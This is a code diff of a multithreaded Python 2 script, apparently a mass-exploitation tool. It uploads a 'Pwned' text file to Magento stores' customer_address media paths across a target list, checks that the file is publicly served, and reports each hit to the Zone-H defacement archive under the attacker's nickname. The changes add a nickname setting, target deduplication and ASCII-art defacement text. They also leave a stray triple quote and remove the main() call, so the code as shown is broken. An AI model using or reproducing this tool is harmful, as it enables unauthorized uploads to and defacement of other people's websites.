@@ -9,6 +9,10 @@ import sys
 import threading
 from Queue import Queue
 
+# ========== KONFIGURASI ==========
+DEFACER_NAME = "YourNick"   # <-- CHANGE WITH YOUR NICKNAME
+# =================================
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 USER_AGENTS = [
@@ -27,6 +31,7 @@ def normalize_url(url):
     url = url.strip()
     if not url.startswith(('http://', 'https://')):
         url = 'https://' + url
+    url = url.replace('https://www.', 'https://').replace('http://www.', 'http://')
     return url.rstrip('/')
 
 def random_form_key(length=16):
@@ -34,15 +39,14 @@ def random_form_key(length=16):
     return ''.join(random.choice(chars) for _ in range(length))
 
 def verify_media_file(base_host, file_path, expected_content, timeout=15):
-    possible_paths = [
-        "/media/customer_address",
-        "/pub/media/customer_address"
-    ]
+
+    possible_paths = ["/media/customer_address", "/pub/media/customer_address"]
     for path_prefix in possible_paths:
         media_url = base_host + path_prefix + file_path
         try:
             check = requests.get(media_url, verify=False, timeout=timeout)
-            if check.status_code == 200 and expected_content in check.text:
+
+            if check.status_code == 200 and expected_content.strip() in check.text:
                 return True, media_url
         except:
             continue
@@ -52,11 +56,15 @@ def upload_txt(host, timeout=15):
     host = normalize_url(host)
     form_key = random_form_key()
     
+    # ASCII art DOG (can be replaced)
     file_content = '''
-    UR TEXT HERE
-  Pwned! Jenderal92!
+   / \__
+  (    @\___
+  /         O
+ /   (_____/
+/_____/   U
+  [[ Woof! Pwned by {} ]]'''.format(DEFACER_NAME)
 '''
-    
     file_name = "Jenderal92.txt"
 
     files = {
@@ -93,9 +101,9 @@ def upload_txt(host, timeout=15):
 
         success, media_url = verify_media_file(host, file_path, file_content, timeout)
         if success:
-            return True, media_url
+            return True, media_url   
         else:
-            return False, "Content verification failed (tried /media/ and /pub/media/)"
+            return False, "File not accessible (404 or content mismatch) after upload"
 
     except requests.exceptions.Timeout:
         return False, "Timeout"
@@ -105,6 +113,7 @@ def upload_txt(host, timeout=15):
         return False, "Exception: {}".format(str(e)[:100])
 
 def submit_to_zoneh(full_media_url):
+    
     try:
         if not full_media_url.startswith(('http://', 'https://')):
             full_media_url = 'http://' + full_media_url
@@ -115,7 +124,7 @@ def submit_to_zoneh(full_media_url):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         }
         data = {
-            'defacer': 'YOUR NICKNAME HERE',
+            'defacer': DEFACER_NAME,
             'domain1': full_media_url,
             'hackmode': '1',
             'reason': '1',
@@ -147,22 +156,27 @@ def worker(q, results):
 
 def main():
     if len(sys.argv) != 2:
-        print("Usage: python upload_test.py list.txt")
+        print("Usage: python magento_upload.py list.txt")
         sys.exit(1)
 
     list_file = sys.argv[1]
     try:
         with open(list_file, "r") as f:
-            hosts = [line.strip() for line in f if line.strip()]
+            raw_hosts = [line.strip() for line in f if line.strip()]
     except Exception as e:
         print("[-] Cannot read {}: {}".format(list_file, e))
         sys.exit(1)
 
-    if not hosts:
+    if not raw_hosts:
         print("[-] No targets found.")
         sys.exit(1)
 
-    print("[+] Loaded {} targets. Starting multithreaded scan (10 workers)...".format(len(hosts)))
+    unique_hosts = {}
+    for h in raw_hosts:
+        norm = normalize_url(h)
+        unique_hosts[norm] = h
+    hosts = list(unique_hosts.keys())
+    print("[+] Loaded {} unique targets (after normalization).".format(len(hosts)))
     print("-" * 60)
 
     num_workers = 10
@@ -195,5 +209,3 @@ def main():
             if success:
                 print("  - {} -> {}".format(host, url))
 
-if __name__ == "__main__":
-    main()
